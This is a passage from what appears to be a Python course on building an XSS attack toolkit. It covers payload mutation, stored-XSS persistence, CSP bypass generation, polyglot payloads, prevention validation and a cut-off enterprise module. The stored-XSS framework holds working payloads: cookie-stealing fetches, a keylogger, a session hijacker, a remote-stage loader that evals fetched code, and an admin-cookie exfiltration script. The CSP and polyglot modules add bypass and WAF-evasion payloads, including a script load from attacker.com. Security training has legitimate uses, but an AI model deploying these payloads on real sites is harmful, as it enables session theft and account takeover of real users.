        for base_payload in base_payloads:
            # Generate context-specific variants
            variants = self._generate_context_variants(base_payload, context)
            adapted_payloads.extend(variants)
            
            # Apply mutations
            for variant in variants[:3]:  # Limit mutations
                mutated = self._apply_mutations(variant, context)
                adapted_payloads.extend(mutated)
        
        return list(set(adapted_payloads))  # Remove duplicates
    
    def _get_default_payloads(self, context: InjectionContext) -> List[str]:
        """Get default payloads for a specific context"""
        context_payloads = {
            InjectionContext.HTML_TAG_CONTENT: [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>'
            ],
            InjectionContext.HTML_ATTRIBUTE_VALUE: [
                '" onmouseover=alert("XSS") "',
                "' onclick=alert('XSS') '",
                '" autofocus onfocus=alert("XSS") "'
            ],
            InjectionContext.JAVASCRIPT_STRING_SINGLE: [
                "';alert('XSS');//",
                "\\\\';alert('XSS');//",
                "'+alert('XSS')+'"
            ],
            InjectionContext.JAVASCRIPT_STRING_DOUBLE: [
                '";alert("XSS");//',
                '\\\\"alert("XSS");//',
                '"+alert("XSS")+"'
            ]
        }
        
        return context_payloads.get(context, ['<script>alert("XSS")</script>'])
    
    def _generate_context_variants(self, payload: str, context: InjectionContext) -> List[str]:
        """Generate context-specific variants of a payload"""
        variants = [payload]
        
        # Add context breakers
        breakers = self.context_breakers.get(context, [])
        for breaker in breakers:
            variants.append(breaker + payload)
            variants.append(payload + breaker)
        
        return variants
    
    def _apply_mutations(self, payload: str, context: InjectionContext) -> List[str]:
        """Apply various mutations to a payload"""
        mutated = []
        
        # Case mutations
        if context != InjectionContext.JAVASCRIPT_STRING_SINGLE:
            mutated.append(self._mutate_case(payload))
        
        # Encoding mutations
        for encoding in ['html', 'url', 'unicode']:
            if encoding in self.encoders:
                encoded = self.encoders[encoding](payload)
                mutated.append(encoded)
        
        # Comment breaking
        if '<script>' in payload:
            mutated.append(payload.replace('<script>', '<scr<!---->ipt>'))
        
        return [m for m in mutated if m != payload]
    
    def _mutate_case(self, payload: str) -> str:
        """Apply case mutations"""
        if '<' in payload:
            import random
            def randomize_case(match):
                tag = match.group(1)
                return '<' + ''.join(random.choice([c.upper(), c.lower()]) for c in tag)
            
            return re.sub(r'<([a-zA-Z]+)', randomize_case, payload)
        return payload
```

---

## Module 4: Stored XSS Persistence Framework (Week 4)
*"Making Your Attacks Stick Around"*

**Learning Goals**: Persistent XSS testing, callback tracking, multi-stage payloads, long-term monitoring
**Security Concepts**: Data persistence, storage mechanisms, callback systems, advanced payload delivery

**What You'll Build**: A framework for testing stored XSS vulnerabilities with callback tracking and persistence analysis.

### The Persistence Challenge

Stored XSS is the most dangerous because it persists and affects every user who views the content. Testing requires sophisticated callback systems and persistence monitoring.

```python
# File: course/exercises/xss_toolkit/persistence/stored_xss_framework.py
import json
import datetime
import sqlite3
from typing import List, Dict, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum

class StorageType(Enum):
    """Types of storage mechanisms for stored XSS"""
    DATABASE = "database"                    # SQL/NoSQL databases
    FILE_SYSTEM = "filesystem"              # File uploads, logs
    CACHE = "cache"                         # Redis, Memcached
    SESSION = "session"                     # Server-side sessions
    EMAIL_QUEUE = "emailQueue"              # Email templates
    LOG_FILES = "logFiles"                  # Application logs

class PersistenceLevel(Enum):
    """Levels of persistence for stored XSS"""
    TEMPORARY = "temporary"                 # Minutes to hours
    SESSION = "session"                     # User session lifetime
    USER_SCOPED = "user_scoped"            # Tied to specific user
    GLOBAL = "global"                       # Affects all users
    PERMANENT = "permanent"                 # Requires manual cleanup

@dataclass
class StoredPayload:
    """Represents a stored XSS payload"""
    payload_id: str
    content: str
    storage_type: StorageType
    persistence_level: PersistenceLevel
    created_at: datetime.datetime
    target_url: str
    storage_location: str
    callbacks_expected: int = 0
    callbacks_received: int = 0
    last_triggered: Optional[datetime.datetime] = None

@dataclass
class CallbackData:
    """Data received from a callback"""
    callback_id: str
    payload_id: str
    timestamp: datetime.datetime
    source_ip: str
    user_agent: str
    cookies: Dict[str, str]
    session_data: Dict[str, Any]

@dataclass
class PersistenceResult:
    """Result of a persistence test"""
    payload: StoredPayload
    storage_successful: bool
    persistence_confirmed: bool
    execution_successful: bool
    callbacks_received: List[CallbackData]
    error_message: Optional[str] = None

class StoredXSSFramework:
    """
    Comprehensive framework for testing stored XSS vulnerabilities.
    
    This framework provides tools for creating persistent payloads,
    tracking callbacks, and analyzing storage behavior.
    """
    
    def __init__(self, callback_server_url: str = "http://localhost:8888"):
        self.callback_server_url = callback_server_url
        self.payloads = {}
        self.callbacks = {}
        
        # Initialize callback database
        self._init_callback_db()
        
        # Payload templates for different scenarios
        self.payload_templates = {
            'basic_callback': '<script>fetch("{callback_url}?data=" + btoa(document.cookie))</script>',
            'keylogger': '<script>document.addEventListener("keydown",function(e){{fetch("{callback_url}/keys?key=" + e.key)}})</script>',
            'admin_detector': '<script>if(document.body.innerHTML.includes("admin")){{fetch("{callback_url}/admin")}}</script>',
            'session_hijacker': '<script>fetch("{callback_url}/session", {{method:"POST", body:JSON.stringify({{cookies:document.cookie}}), headers:{{"Content-Type":"application/json"}}}})</script>',
            'persistent_beacon': '<script>setInterval(function(){{fetch("{callback_url}/beacon?t=" + Date.now())}}, 30000)</script>',
            'delayed_execution': '<script>setTimeout(function(){{fetch("{callback_url}/delayed")}}, 10000)</script>'
        }
    
    def _init_callback_db(self):
        """Initialize SQLite database for tracking callbacks"""
        self.db_path = "/tmp/xss_callbacks.db"
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS callbacks (
                id TEXT PRIMARY KEY,
                payload_id TEXT,
                timestamp REAL,
                source_ip TEXT,
                user_agent TEXT,
                cookies TEXT,
                session_data TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def create_persistent_payload(self, content: str, storage_type: StorageType,
                                target_url: str, persistence_level: PersistenceLevel = PersistenceLevel.SESSION,
                                template: Optional[str] = None) -> StoredPayload:
        """Create a stored XSS payload configured for specific persistence requirements."""
        import uuid
        payload_id = str(uuid.uuid4())
        
        # Use template if specified
        if template and template in self.payload_templates:
            base_content = self.payload_templates[template].format(
                callback_url=self.callback_server_url
            )
        else:
            base_content = content
        
        # Generate storage location based on type
        storage_location = self._generate_storage_location(storage_type, target_url)
        
        payload = StoredPayload(
            payload_id=payload_id,
            content=base_content,
            storage_type=storage_type,
            persistence_level=persistence_level,
            created_at=datetime.datetime.now(),
            target_url=target_url,
            storage_location=storage_location,
            callbacks_expected=1
        )
        
        self.payloads[payload_id] = payload
        return payload
    
    def test_persistence(self, payload: StoredPayload, 
                        test_function: Callable[[str], Any],
                        verification_delay: int = 5) -> PersistenceResult:
        """Test a stored XSS payload for persistence and execution."""
        result = PersistenceResult(
            payload=payload,
            storage_successful=False,
            persistence_confirmed=False,
            execution_successful=False,
            callbacks_received=[]
        )
        
        try:
            # Step 1: Attempt to store the payload
            storage_response = test_function(payload.content)
            result.storage_successful = self._verify_storage_success(storage_response)
            
            if not result.storage_successful:
                result.error_message = "Payload storage failed"
                return result
            
            # Step 2: Wait for potential execution
            import time
            time.sleep(verification_delay)
            
            # Step 3: Check for callbacks
            callbacks = self._check_callbacks(payload.payload_id)
            result.callbacks_received = callbacks
            result.execution_successful = len(callbacks) > 0
            
            # Step 4: Verify persistence
            result.persistence_confirmed = self._verify_persistence(payload)
            
        except Exception as e:
            result.error_message = str(e)
        
        return result
    
    def create_multi_stage_payload(self, stages: List[str], 
                                 storage_type: StorageType,
                                 target_url: str) -> StoredPayload:
        """Create a multi-stage payload that downloads additional code."""
        import uuid
        stage_id = str(uuid.uuid4())
        
        # Store stages on callback server
        self._store_stages(stage_id, stages)
        
        # Create initial payload that fetches subsequent stages
        initial_payload = f'''
        <script>
        (function() {{
            var stageId = '{stage_id}';
            var callbackUrl = '{self.callback_server_url}';
            
            fetch(callbackUrl + '/stage/' + stageId + '/0')
                .then(r => r.text())
                .then(code => eval(code))
                .catch(e => console.error('Stage execution failed:', e));
        }})();
        </script>
        '''
        
        return self.create_persistent_payload(
            content=initial_payload,
            storage_type=storage_type,
            target_url=target_url,
            persistence_level=PersistenceLevel.PERMANENT
        )
    
    def create_admin_targeting_payload(self, storage_type: StorageType,
                                     target_url: str) -> StoredPayload:
        """Create a payload specifically designed to target admin users."""
        admin_payload = f'''
        <script>
        (function() {{
            var indicators = ['admin', 'administrator', 'dashboard'];
            var isAdmin = false;
            var pageContent = document.body.innerText.toLowerCase();
            
            for (var i = 0; i < indicators.length; i++) {{
                if (pageContent.includes(indicators[i])) {{
                    isAdmin = true;
                    break;
                }}
            }}
            
            if (isAdmin) {{
                var adminData = {{
                    url: window.location.href,
                    cookies: document.cookie,
                    timestamp: new Date().toISOString()
                }};
                
                fetch('{self.callback_server_url}/admin-pwned', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(adminData)
                }});
            }}
        }})();
        </script>
        '''
        
        return self.create_persistent_payload(
            content=admin_payload,
            storage_type=storage_type,
            target_url=target_url,
            persistence_level=PersistenceLevel.GLOBAL
        )
    
    def _generate_storage_location(self, storage_type: StorageType, target_url: str) -> str:
        """Generate storage location identifier"""
        import hashlib
        if storage_type == StorageType.DATABASE:
            return f"table:comments,column:content,url:{target_url}"
        elif storage_type == StorageType.FILE_SYSTEM:
            return f"path:/uploads/comments/{hashlib.md5(target_url.encode()).hexdigest()}.txt"
        else:
            return f"{storage_type.value}:{target_url}"
    
    def _verify_storage_success(self, response: Any) -> bool:
        """Verify if payload storage was successful"""
        if hasattr(response, 'status_code'):
            return response.status_code < 400
        return True  # Assume success if we can't determine
    
    def _check_callbacks(self, payload_id: str) -> List[CallbackData]:
        """Check for callbacks received for a specific payload"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM callbacks WHERE payload_id = ?', (payload_id,))
        callbacks = []
        
        for row in cursor.fetchall():
            callbacks.append(CallbackData(
                callback_id=row[0],
                payload_id=row[1],
                timestamp=datetime.datetime.fromtimestamp(row[2]),
                source_ip=row[3],
                user_agent=row[4],
                cookies=json.loads(row[5]) if row[5] else {},
                session_data=json.loads(row[6]) if row[6] else {}
            ))
        
        conn.close()
        return callbacks
    
    def _verify_persistence(self, payload: StoredPayload) -> bool:
        """Verify if payload persists in storage"""
        # This would involve checking if the payload still exists
        return True  # Simplified for this example
    
    def _store_stages(self, stage_id: str, stages: List[str]):
        """Store multi-stage payload stages"""
        # This would store stages on the callback server
        pass
```

---

## Module 5: CSP Bypass Analyzer and Generator (Week 5)
*"Breaking the Rules (That Were Meant to Protect)"*

**Learning Goals**: Content Security Policy analysis, bypass technique identification, policy weakness detection
**Security Concepts**: CSP directives, policy enforcement, bypass methodologies, security headers

**What You'll Build**: An analyzer that parses CSP policies and generates specific bypass payloads for identified weaknesses.

### The CSP Challenge

Content Security Policy is supposed to prevent XSS, but many implementations have weaknesses. Smart attackers know how to find and exploit these gaps.

```python
# File: course/exercises/xss_toolkit/csp/bypass_analyzer.py
import re
import json
from typing import List, Dict, Set, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

class CSPDirective(Enum):
    """CSP directive types"""
    SCRIPT_SRC = "script-src"              # Controls script execution sources
    OBJECT_SRC = "object-src"              # Controls object/embed sources
    STYLE_SRC = "style-src"                # Controls stylesheet sources
    DEFAULT_SRC = "default-src"            # Fallback for other directives
    UNSAFE_INLINE = "'unsafe-inline'"      # Allows inline scripts
    UNSAFE_EVAL = "'unsafe-eval'"          # Allows eval() usage

class BypassTechnique(Enum):
    """Types of CSP bypass techniques"""
    UNSAFE_INLINE = "unsafe_inline"                    # Exploit 'unsafe-inline'
    JSONP_CALLBACK = "jsonp_callback"                 # JSONP callback injection
    ANGULAR_INJECTION = "angular_injection"           # AngularJS template injection
    SCRIPT_GADGET = "script_gadget"                   # DOM-based script gadgets
    BASE_URI_INJECTION = "base_uri_injection"         # Base URI manipulation
    WHITELISTED_DOMAIN = "whitelisted_domain"         # Trusted domain exploitation

@dataclass
class CSPBypassPayload:
    """A payload designed to bypass specific CSP configurations"""
    technique: BypassTechnique
    payload: str
    description: str
    requirements: List[str]
    confidence: float                                # Success probability (0.0-1.0)
    affected_directives: List[CSPDirective]

@dataclass
class CSPAnalysisResult:
    """Results of CSP policy analysis"""
    policy_header: str
    bypass_opportunities: List[CSPBypassPayload]
    security_score: float                           # Overall score (0.0-10.0)
    critical_issues: List[str]
    recommendations: List[str]
    is_bypassable: bool

class CSPBypassAnalyzer:
    """
    Advanced Content Security Policy bypass analyzer.
    
    This analyzer examines CSP policies to identify bypass opportunities
    and generates practical exploit payloads.
    """
    
    def __init__(self):
        # Initialize bypass technique generators
        self.bypass_generators = {
            BypassTechnique.UNSAFE_INLINE: self._generate_unsafe_inline_bypass,
            BypassTechnique.JSONP_CALLBACK: self._generate_jsonp_bypass,
            BypassTechnique.ANGULAR_INJECTION: self._generate_angular_bypass,
            BypassTechnique.SCRIPT_GADGET: self._generate_script_gadget_bypass,
            BypassTechnique.BASE_URI_INJECTION: self._generate_base_uri_bypass,
            BypassTechnique.WHITELISTED_DOMAIN: self._generate_whitelisted_domain_bypass
        }
        
        # Common whitelisted domains that might allow bypass
        self.common_whitelist_domains = {
            'googleapis.com',      # Google APIs (JSONP endpoints)
            'google.com',         # Google services
            'cdnjs.cloudflare.com', # CDNJS
            'ajax.googleapis.com', # jQuery CDN
            'github.io',          # GitHub Pages
            'herokuapp.com'       # Heroku hosting
        }
    
    def analyze_csp(self, csp_header: str) -> CSPAnalysisResult:
        """
        Analyze a CSP header for bypass opportunities.
        
        Args:
            csp_header: The Content-Security-Policy header value
            
        Returns:
            CSPAnalysisResult containing analysis and bypass opportunities
        """
        # Parse the CSP header
        directives = self._parse_csp_header(csp_header)
        
        # Identify bypass opportunities
        bypass_opportunities = []
        for technique in BypassTechnique:
            bypasses = self._analyze_bypass_technique(technique, directives)
            bypass_opportunities.extend(bypasses)
        
        # Calculate security score
        security_score = self._calculate_security_score(directives, bypass_opportunities)
        
        # Identify critical issues
        critical_issues = self._identify_critical_issues(directives)
        
        # Generate recommendations
        recommendations = self._generate_recommendations(directives)
        
        # Determine if CSP is bypassable
        is_bypassable = len([b for b in bypass_opportunities if b.confidence > 0.7]) > 0
        
        return CSPAnalysisResult(
            policy_header=csp_header,
            bypass_opportunities=bypass_opportunities,
            security_score=security_score,
            critical_issues=critical_issues,
            recommendations=recommendations,
            is_bypassable=is_bypassable
        )
    
    def _parse_csp_header(self, csp_header: str) -> Dict[str, List[str]]:
        """Parse CSP header into directive dictionary"""
        directives = {}
        
        # Split by semicolons and parse each directive
        for directive_string in csp_header.split(';'):
            directive_string = directive_string.strip()
            if not directive_string:
                continue
            
            parts = directive_string.split()
            if parts:
                directive_name = parts[0]
                directive_values = parts[1:] if len(parts) > 1 else []
                directives[directive_name] = directive_values
        
        return directives
    
    def _analyze_bypass_technique(self, technique: BypassTechnique, 
                                directives: Dict[str, List[str]]) -> List[CSPBypassPayload]:
        """Analyze if a specific bypass technique is possible"""
        if technique in self.bypass_generators:
            return self.bypass_generators[technique](directives)
        return []
    
    def _generate_unsafe_inline_bypass(self, directives: Dict[str, List[str]]) -> List[CSPBypassPayload]:
        """Generate bypasses for unsafe-inline configurations"""
        bypasses = []
        
        # Check script-src for unsafe-inline
        script_src = directives.get('script-src', [])
        if "'unsafe-inline'" in script_src:
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.UNSAFE_INLINE,
                payload='<script>alert("CSP Bypass - Unsafe Inline")</script>',
                description="Direct inline script execution via 'unsafe-inline'",
                requirements=["'unsafe-inline' in script-src"],
                confidence=0.95,
                affected_directives=[CSPDirective.SCRIPT_SRC]
            ))
        
        return bypasses
    
    def _generate_jsonp_bypass(self, directives: Dict[str, List[str]]) -> List[CSPBypassPayload]:
        """Generate JSONP callback bypasses for whitelisted domains"""
        bypasses = []
        
        script_src = directives.get('script-src', [])
        
        # Check for common JSONP-enabled domains
        jsonp_domains = {
            'googleapis.com': 'https://accounts.google.com/o/oauth2/revoke?callback=alert',
            'google.com': 'https://www.google.com/complete/search?client=chrome&jsonp=alert'
        }
        
        for domain, jsonp_url in jsonp_domains.items():
            if any(domain in source for source in script_src):
                bypasses.append(CSPBypassPayload(
                    technique=BypassTechnique.JSONP_CALLBACK,
                    payload=f'<script src="{jsonp_url}"></script>',
                    description=f"JSONP callback execution via whitelisted {domain}",
                    requirements=[f"{domain} whitelisted in script-src"],
                    confidence=0.8,
                    affected_directives=[CSPDirective.SCRIPT_SRC]
                ))
        
        return bypasses
    
    def _generate_angular_bypass(self, directives: Dict[str, List[str]]) -> List[CSPBypassPayload]:
        """Generate AngularJS template injection bypasses"""
        bypasses = []
        
        # AngularJS bypasses work when unsafe-eval is present
        script_src = directives.get('script-src', [])
        if "'unsafe-eval'" in script_src:
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.ANGULAR_INJECTION,
                payload='{{constructor.constructor("alert(\\"CSP Bypass\\")")()}}',
                description="AngularJS template injection with constructor escape",
                requirements=["AngularJS framework", "'unsafe-eval' in CSP"],
                confidence=0.7,
                affected_directives=[CSPDirective.SCRIPT_SRC]
            ))
        
        return bypasses
    
    def _generate_script_gadget_bypass(self, directives: Dict[str, List[str]]) -> List[CSPBypassPayload]:
        """Generate script gadget bypasses"""
        bypasses = []
        
        script_src = directives.get('script-src', [])
        if script_src:  # If there are script sources
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.SCRIPT_GADGET,
                payload='<div id="1" data-url="javascript:alert(\\'Script Gadget\\')"></div>',
                description='DOM-based script gadget via data attributes',
                requirements=['Vulnerable JavaScript framework'],
                confidence=0.4,
                affected_directives=[CSPDirective.SCRIPT_SRC]
            ))
        
        return bypasses
    
    def _generate_base_uri_bypass(self, directives: Dict[str, List[str]]) -> List[CSPBypassPayload]:
        """Generate base URI manipulation bypasses"""
        bypasses = []
        
        # Check if base-uri is not restricted
        if 'base-uri' not in directives:
            bypasses.append(CSPBypassPayload(
                technique=BypassTechnique.BASE_URI_INJECTION,
                payload='<base href="//attacker.com/"><script src="malicious.js"></script>',
                description="Base URI manipulation to load scripts from attacker domain",
                requirements=["base-uri not restricted"],
                confidence=0.6,
                affected_directives=[CSPDirective.SCRIPT_SRC]
            ))
        
        return bypasses
    
    def _generate_whitelisted_domain_bypass(self, directives: Dict[str, List[str]]) -> List[CSPBypassPayload]:
        """Generate bypasses using whitelisted domains"""
        bypasses = []
        
        script_src = directives.get('script-src', [])
        
        # Check for vulnerable whitelisted domains
        vulnerable_domains = {
            'github.io': 'https://username.github.io/repo/xss.js',
            'herokuapp.com': 'https://evil-app.herokuapp.com/xss.js'
        }
        
        for domain, example_url in vulnerable_domains.items():
            if any(domain in source for source in script_src):
                bypasses.append(CSPBypassPayload(
                    technique=BypassTechnique.WHITELISTED_DOMAIN,
                    payload=f'<script src="{example_url}"></script>',
                    description=f"Whitelisted domain abuse via {domain}",
                    requirements=[f"Control over content on {domain}"],
                    confidence=0.6,
                    affected_directives=[CSPDirective.SCRIPT_SRC]
                ))
        
        return bypasses
    
    def _calculate_security_score(self, directives: Dict[str, List[str]], 
                                bypasses: List[CSPBypassPayload]) -> float:
        """Calculate overall security score (0.0-10.0)"""
        score = 5.0  # Start with neutral score
        
        # Check for dangerous configurations
        script_src = directives.get('script-src', [])
        if "'unsafe-inline'" in script_src:
            score -= 3.0
        if "'unsafe-eval'" in script_src:
            score -= 2.0
        if '*' in script_src:
            score -= 2.0
        
        # Penalty for high-confidence bypasses
        high_confidence_bypasses = [b for b in bypasses if b.confidence > 0.7]
        score -= len(high_confidence_bypasses) * 0.5
        
        return max(0.0, min(10.0, score))
    
    def _identify_critical_issues(self, directives: Dict[str, List[str]]) -> List[str]:
        """Identify critical security issues in CSP"""
        issues = []
        
        script_src = directives.get('script-src', [])
        if "'unsafe-inline'" in script_src:
            issues.append("'unsafe-inline' allows arbitrary inline script execution")
        if "'unsafe-eval'" in script_src:
            issues.append("'unsafe-eval' allows eval() and Function() usage")
        if '*' in script_src:
            issues.append("Wildcard (*) allows scripts from any domain")
        
        return issues
    
    def _generate_recommendations(self, directives: Dict[str, List[str]]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        script_src = directives.get('script-src', [])
        if "'unsafe-inline'" in script_src:
            recommendations.append("Remove 'unsafe-inline' and use nonces or hashes")
        if "'unsafe-eval'" in script_src:
            recommendations.append("Remove 'unsafe-eval' and avoid eval() usage")
        if 'object-src' not in directives:
            recommendations.append("Add 'object-src 'none'' to prevent plugin execution")
        
        return recommendations
```

---

## Module 6: Advanced Polyglot Engine (Week 6)
*"One Payload to Rule Them All"*

**Learning Goals**: Multi-context payload generation, polyglot construction, universal bypass techniques
**Security Concepts**: Context independence, payload optimization, universal exploitation

**What You'll Build**: An engine that generates polyglot payloads working across multiple injection contexts simultaneously.

```python
# File: course/exercises/xss_toolkit/polyglot/advanced_engine.py
from typing import List, Dict, Set, Optional
from dataclasses import dataclass
from enum import Enum

class PolyglotContext(Enum):
    """Contexts where polyglot payloads need to work"""
    HTML_CONTENT = "html_content"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT_STRING = "javascript_string"
    CSS_PROPERTY = "css_property"
    URL_PARAMETER = "url_parameter"

@dataclass
class PolyglotPayload:
    """Generated polyglot payload with metadata"""
    payload: str
    contexts: Set[PolyglotContext]
    confidence: float
    length: int
    browser_compatibility: Dict[str, float]
    waf_evasion_score: float

class AdvancedPolyglotEngine:
    """
    Advanced engine for generating sophisticated polyglot XSS payloads.
    
    Creates payloads that work across multiple injection contexts and browsers.
    """
    
    def __init__(self):
        # Base components for polyglot construction
        self.base_components = [
            # Universal script execution
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            
            # Attribute breaking
            '" onmouseover=alert(1) "',
            "' onclick=alert(1) '",
            
            # JavaScript context
            "';alert(1);//",
            '";alert(1);//',
            
            # Multi-context breaking
            '</script><img src=x onerror=alert(1)>',
            '--></script><svg onload=alert(1)><!--'
        ]
        
        # Encoding techniques
        self.encoders = {
            'html': lambda x: x.replace('<', '&lt;').replace('>', '&gt;'),
            'url': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x)
        }
    
    def generate_polyglots(self, target_contexts: Set[PolyglotContext], 
                          max_length: int = 500) -> List[PolyglotPayload]:
        """Generate polyglot payloads for specified contexts."""
        payloads = []
        
        # Try different combination strategies
        for strategy in ['concatenation', 'encoding_chains', 'comment_breaking']:
            payload = self._generate_with_strategy(strategy, target_contexts, max_length)
            if payload:
                payloads.append(payload)
        
        # Sort by confidence
        return sorted(payloads, key=lambda p: p.confidence, reverse=True)
    
    def _generate_with_strategy(self, strategy: str, contexts: Set[PolyglotContext], 
                              max_length: int) -> Optional[PolyglotPayload]:
        """Generate payload using specific strategy"""
        if strategy == 'concatenation':
            return self._concatenation_strategy(contexts, max_length)
        elif strategy == 'encoding_chains':
            return self._encoding_chain_strategy(contexts, max_length)
        elif strategy == 'comment_breaking':
            return self._comment_breaking_strategy(contexts, max_length)
        
        return None
    
    def _concatenation_strategy(self, contexts: Set[PolyglotContext], 
                              max_length: int) -> Optional[PolyglotPayload]:
        """Concatenate components for multiple contexts"""
        # Universal polyglot that works in many contexts
        polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//'
        
        if len(polyglot) <= max_length:
            return PolyglotPayload(
                payload=polyglot,
                contexts=contexts,
                confidence=0.6,
                length=len(polyglot),
                browser_compatibility={'chrome': 0.8, 'firefox': 0.7, 'safari': 0.6},
                waf_evasion_score=0.7
            )
        
        return None
    
    def _encoding_chain_strategy(self, contexts: Set[PolyglotContext], 
                               max_length: int) -> Optional[PolyglotPayload]:
        """Use encoding chains for evasion"""
        base_payload = '<script>alert(1)</script>'
        
        # Apply multiple encodings
        encoded = base_payload
        for encoding in ['html', 'url']:
            if encoding in self.encoders:
                encoded = self.encoders[encoding](encoded)
        
        if len(encoded) <= max_length:
            return PolyglotPayload(
                payload=encoded,
                contexts={PolyglotContext.HTML_CONTENT, PolyglotContext.URL_PARAMETER},
                confidence=0.5,
                length=len(encoded),
                browser_compatibility={'chrome': 0.9, 'firefox': 0.9, 'safari': 0.8},
                waf_evasion_score=0.8
            )
        
        return None
    
    def _comment_breaking_strategy(self, contexts: Set[PolyglotContext], 
                                 max_length: int) -> Optional[PolyglotPayload]:
        """Use comment breaking for bypass"""
        payload = '<scr<!---->ipt>alert(1)</scr<!---->ipt>'
        
        if len(payload) <= max_length:
            return PolyglotPayload(
                payload=payload,
                contexts={PolyglotContext.HTML_CONTENT},
                confidence=0.7,
                length=len(payload),
                browser_compatibility={'chrome': 0.8, 'firefox': 0.8, 'safari': 0.7},
                waf_evasion_score=0.9
            )
        
        return None
```

---

## Module 7: XSS Prevention Validation Tools (Week 7)
*"Testing the Guards at the Gate"*

**Learning Goals**: Security control validation, prevention mechanism testing, defensive assessment
**Security Concepts**: Input sanitization, output encoding, defense verification

**What You'll Build**: Tools to validate that XSS prevention mechanisms are working correctly.

```python
# File: course/exercises/xss_toolkit/prevention/validation_tools.py
from typing import List, Dict, Callable
from dataclasses import dataclass
from enum import Enum

class PreventionMechanism(Enum):
    """Types of XSS prevention mechanisms"""
    INPUT_SANITIZATION = "input_sanitization"
    OUTPUT_ENCODING = "output_encoding"
    CSP_POLICY = "csp_policy"
    WAF_RULES = "waf_rules"

@dataclass
class PreventionTestResult:
    """Result of a prevention mechanism test"""
    mechanism: PreventionMechanism
    test_name: str
    passed: bool
    input_payload: str
    actual_output: str
    expected_output: str
    risk_level: str
    remediation: str

class XSSPreventionValidator:
    """
    Comprehensive validator for XSS prevention mechanisms.
    
    Tests various prevention techniques to ensure they properly
    protect against XSS attacks.
    """
    
    def __init__(self):
        # Test vectors for different prevention mechanisms
        self.xss_vectors = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '" onmouseover=alert("XSS") "',
            "' onclick=alert('XSS') '",
            'javascript:alert("XSS")',
            '%3Cscript%3Ealert("XSS")%3C/script%3E'
        ]
    
    def test_sanitization(self, sanitizer_function: Callable[[str], str]) -> List[PreventionTestResult]:
        """Test a sanitization function against various XSS vectors."""
        results = []
        
        for vector in self.xss_vectors:
            try:
                sanitized = sanitizer_function(vector)
                passed = self._is_output_safe(sanitized)
                
                result = PreventionTestResult(
                    mechanism=PreventionMechanism.INPUT_SANITIZATION,
                    test_name=f"sanitize_{vector[:20]}",
                    passed=passed,
                    input_payload=vector,
                    actual_output=sanitized,
                    expected_output="Safe encoded output",
                    risk_level="high" if not passed else "low",
                    remediation="Apply proper HTML encoding" if not passed else "Working correctly"
                )
                results.append(result)
                
            except Exception as e:
                result = PreventionTestResult(
                    mechanism=PreventionMechanism.INPUT_SANITIZATION,
                    test_name=f"sanitize_{vector[:20]}",
                    passed=False,
                    input_payload=vector,
                    actual_output=f"ERROR: {str(e)}",
                    expected_output="Safe encoded output",
                    risk_level="critical",
                    remediation="Fix sanitization function error"
                )
                results.append(result)
        
        return results
    
    def test_encoding(self, encoder_function: Callable[[str], str]) -> List[PreventionTestResult]:
        """Test an encoding function."""
        results = []
        
        test_cases = [
            ('<script>', '&lt;script&gt;'),
            ('"onclick=alert()', '&quot;onclick=alert()'),
            ("'onmouseover=alert()", '&#x27;onmouseover=alert()')
        ]
        
        for input_val, expected in test_cases:
            try:
                encoded = encoder_function(input_val)
                passed = encoded == expected
                
                result = PreventionTestResult(
                    mechanism=PreventionMechanism.OUTPUT_ENCODING,
                    test_name=f"encode_{input_val}",
                    passed=passed,
                    input_payload=input_val,
                    actual_output=encoded,
                    expected_output=expected,
                    risk_level="high" if not passed else "low",
                    remediation=f"Expected {expected}, got {encoded}" if not passed else "Working correctly"
                )
                results.append(result)
                
            except Exception as e:
                result = PreventionTestResult(
                    mechanism=PreventionMechanism.OUTPUT_ENCODING,
                    test_name=f"encode_{input_val}",
                    passed=False,
                    input_payload=input_val,
                    actual_output=f"ERROR: {str(e)}",
                    expected_output=expected,
                    risk_level="critical",
                    remediation="Fix encoding function error"
                )
                results.append(result)
        
        return results
    
    def _is_output_safe(self, output: str) -> bool:
        """Check if sanitized output is safe"""
        # Check for dangerous patterns
        dangerous_patterns = [
            r'<script[^>]*>',
            r'on\\w+\\s*=',
            r'javascript:',
            r'<iframe[^>]*>'
        ]
        
        import re
        for pattern in dangerous_patterns:
            if re.search(pattern, output, re.IGNORECASE):
                return False
        
        return True
```

---

## Module 8: Enterprise Integration Suite (Week 8)
*"Building Production-Ready Security Operations"*

**Learning Goals**: Enterprise integration, CI/CD security, compliance reporting, team workflows
**Security Concepts**: DevSecOps, security operations, compliance frameworks, enterprise security

**What You'll Build**: Production-ready integrations for CI/CD pipelines, SIEM platforms, and compliance reporting.

```python
# File: course/exercises/xss_toolkit/enterprise/integration_suite.py
import json
import datetime
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

class IntegrationType(Enum):
    """Types of enterprise integrations"""
    CI_CD_PIPELINE = "cicd_pipeline"
    BUG_TRACKING = "bug_tracking"
    SIEM_PLATFORM = "siem_platform"
    SECURITY_DASHBOARD = "security_dashboard"
    NOTIFICATION_SYSTEM = "notification_system"
    COMPLIANCE_REPORTING = "compliance_reporting"

class SeverityLevel(Enum):
    """Severity levels for vulnerability findings"""
    CRITICAL = "critical"
    HIGH = "high"
